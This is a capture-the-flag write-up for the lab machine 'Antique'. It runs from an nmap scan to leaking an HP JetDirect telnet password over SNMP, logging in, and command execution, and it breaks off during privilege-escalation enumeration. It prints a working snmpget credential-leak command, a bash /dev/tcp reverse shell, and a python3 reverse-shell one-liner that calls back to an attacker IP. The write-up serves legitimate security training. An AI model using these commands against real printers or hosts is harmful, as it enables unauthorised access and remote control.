# Antique

## Information Gathering
Antique
10.10.11.107

## Enumeration
Nmap scan:<br>
```bash
# Nmap 7.92 scan initiated Wed Feb  2 20:57:56 2022 as: nmap -A -p- -oN nmap/antique.nmap 10.10.11.107
Nmap scan report for 10.10.11.107
Host is up (0.039s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
23/tcp open  telnet?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
|     JetDirect
|     Password:
|   NULL: 
|_    JetDirect
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port23-TCP:V=7.92%I=7%D=2/2%Time=61FB36C5%P=x86_64-pc-linux-gnu%r(NULL,
SF:F,"\nHP\x20JetDirect\n\n")%r(GenericLines,19,"\nHP\x20JetDirect\n\nPass
SF:word:\x20")%r(tn3270,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(GetRequ
SF:est,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(HTTPOptions,19,"\nHP\x20
SF:JetDirect\n\nPassword:\x20")%r(RTSPRequest,19,"\nHP\x20JetDirect\n\nPas
SF:sword:\x20")%r(RPCCheck,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNSV
SF:ersionBindReqTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNSStatusRe
SF:questTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Help,19,"\nHP\x20Je
SF:tDirect\n\nPassword:\x20")%r(SSLSessionReq,19,"\nHP\x20JetDirect\n\nPas
SF:sword:\x20")%r(TerminalServerCookie,19,"\nHP\x20JetDirect\n\nPassword:\
SF:x20")%r(TLSSessionReq,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Kerber
SF:os,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(SMBProgNeg,19,"\nHP\x20Je
SF:tDirect\n\nPassword:\x20")%r(X11Probe,19,"\nHP\x20JetDirect\n\nPassword
SF::\x20")%r(FourOhFourRequest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(
SF:LPDString,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPSearchReq,19,"
SF:\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPBindReq,19,"\nHP\x20JetDirec
SF:t\n\nPassword:\x20")%r(SIPOptions,19,"\nHP\x20JetDirect\n\nPassword:\x2
SF:0")%r(LANDesk-RC,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(TerminalSer
SF:ver,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(NCP,19,"\nHP\x20JetDirec
SF:t\n\nPassword:\x20")%r(NotesRPC,19,"\nHP\x20JetDirect\n\nPassword:\x20"
SF:)%r(JavaRMI,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(WMSRequest,19,"\
SF:nHP\x20JetDirect\n\nPassword:\x20")%r(oracle-tns,19,"\nHP\x20JetDirect\
SF:n\nPassword:\x20")%r(ms-sql-s,19,"\nHP\x20JetDirect\n\nPassword:\x20")%
SF:r(afp,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(giop,19,"\nHP\x20JetDi
SF:rect\n\nPassword:\x20");
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 5.3 - 5.4 (94%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   39.29 ms 10.10.14.1
2   39.33 ms 10.10.11.107

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb  2 21:01:14 2022 -- 1 IP address (1 host up) scanned in 198.44 seconds

```

## Exploitation
Just a telnet service. It appears to be a HP JetDirect but I don't have a model or version. Doing a little bit of Googleing and I find <a href="http://www.irongeek.com/i.php?page=security/networkprinterhacking">this</a> really good blog on printer hacking. The blog also refences <a href="https://bugtraq.securityfocus.com/detail/001601c2e1a9$211b11e0$0d01a8c0">this bugtraq</a> blog which also has some good information.<br>
You can use a <b>SNMP toolkit</b> to read the following object identifier (OID) from the printer.<br>
.iso.org.dod.internet.private.enterprise.hp.nm.system.net-peripheral.net-printer.generalDeviceStatus.gdPassword (In numerical form: .1.3.6.1.4.1.11.2.3.9.1.1.13.0)
Most people leave their SNMP community name as "public".

```bash
snmpget -v 1 -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0

iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
```
Converting the BITS from hex to ascii yields: 
```
P@ssw0rd@123!!123..q.."2Rbs..3CSs..$4...Eu..WGW.(8i	.IY...a..A...".1&..1.A5
```
Looks like a password has been leaked. I can use this to log into the machine
```bash
telnet 10.10.11.107 23

Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect


Password: P@ssw0rd@123!!123

Please type "?" for HELP
> ?

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session
```
I can use exec to execute commands and get the user flag.

## Privelge Escalation
Using this python3 command to get a fully interactive reverse shell. I tried doing the classic: <b>bash -i >& /dev/tcp/10.10.10.10/1337 0>&1</b> never seemed to work.
```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.122",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

### Enumeration
```bash
hostname
antique

uname -a 
Linux antique 5.13.0-051300-generic #202106272333 SMP Sun Jun 27 23:36:43 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux

cat /etc/issue
Ubuntu 20.04.3 LTS \n \l

env 
SHELL=/usr/sbin/nologin
SUDO_GID=0
SUDO_COMMAND=/usr/bin/authbind --deep python3 /var/spool/lpd/telnet.py
SUDO_USER=root
PWD=/var/spool/lpd
LOGNAME=lp
LD_PRELOAD=/usr/lib/authbind/libauthbind.so.1
HOME=/var/spool/lpd
LANG=en_US.UTF-8
TERM=xterm
USER=lp
SHLVL=1
AUTHBIND_LIB=/usr/lib/authbind/libauthbind.so.1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
AUTHBIND_LEVELS=y
SUDO_UID=0
MAIL=/var/mail/lp
_=/usr/bin/env
OLDPWD=/var/spool/lpd

